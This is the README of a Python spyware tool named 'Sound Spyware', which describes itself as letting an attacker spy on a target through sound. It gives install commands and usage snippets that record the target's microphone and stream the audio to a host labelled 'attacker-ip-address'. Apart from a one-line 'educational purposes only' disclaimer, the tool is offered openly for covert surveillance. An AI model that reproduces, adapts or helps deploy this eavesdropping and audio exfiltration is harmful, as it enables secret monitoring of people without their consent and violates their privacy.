# Sound Spyware

![image](https://drive.google.com/uc?export=download&id=1QIDeHZLSI4raR4RdD3BMUhRqwH58YSUG)

## Disclaimer

This script is for educational purposes only, I don't endorse or promote it's illegal usage

## Table of Contents

1. [Overview](#overview)
2. [Features](#features)
3. [Languages](#languages)
4. [Installations](#installations)
5. [Usage](#usage)
6. [Run](#run)

## Overview

This script allows an attacker spy on a target through the sound

## Features

- You can record sound of target
- It streams the target's sound to the attacker

## Languages

- Python 3.9.7

## Installations

```shell
git clone https://github.com/favoursyre/sound-spyware.git && cd sound-spyware
```

```shell
pip install requirements.txt
```

## Usage

Instantiating the class

```python
attacker, target = "attacker-name", "target-name"
soundSpy = SoundIntel(attacker, target)
```

To record the sound of the target's system

```python
secs = 50
audioFile = soundSpy.soundRecord(secs)
```

To stream the sound from the target to the attacker
On target's system

```python
host = "attacker-ip-address"
stream = soundSpy.sender(host)
```

On attacker's system

```python
host = "attacker-ip-address"
stream = soundSpy.receiver(host)
```

## Run

```shell
python sound.py
```

To use the streaming function, first run the software on attacker's system before running on the target's system
